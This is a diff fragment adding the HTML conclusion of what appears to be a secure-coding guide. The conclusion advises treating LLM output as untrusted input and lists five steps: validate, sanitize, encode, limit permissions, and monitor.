+<h2>Conclusion</h2>
+
+<p>These examples demonstrate the critical importance of treating LLM outputs as untrusted input. Always:</p>
+
+<ol>
+<li><strong>Validate</strong> - Check format and content</li>
+<li><strong>Sanitize</strong> - Remove dangerous characters</li>
+<li><strong>Encode</strong> - Use context-appropriate encoding</li>
+<li><strong>Limit</strong> - Restrict permissions and capabilities</li>
+<li><strong>Monitor</strong> - Log and alert on suspicious patterns</li>
+</ol>
+
+<p>Remember: <strong>Secure coding practices for user input apply equally to LLM output.</strong></p>
+
         </div>
     </div>
 </body>
